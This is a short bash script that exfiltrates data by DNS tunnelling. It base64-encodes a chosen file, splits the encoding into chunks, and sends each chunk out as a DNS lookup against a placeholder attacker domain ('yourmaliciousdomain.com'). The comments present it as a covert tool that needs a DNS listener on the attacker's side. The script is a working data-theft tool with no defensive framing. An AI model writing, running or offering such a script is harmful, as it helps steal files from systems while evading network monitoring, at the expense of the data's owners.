#!/bin/bash
# Exfil small data using DNS (requires custom DNS server listener)
# Works well for covert/low-bandwidth scenarios. Needs a DNS server on your side to capture logs.
DOMAIN="yourmaliciousdomain.com"
DATA=$(cat "$1" | base64 | tr -d '\n' | fold -w50)

for CHUNK in $DATA; do
    host "$CHUNK.$DOMAIN" > /dev/null
    sleep 1
done
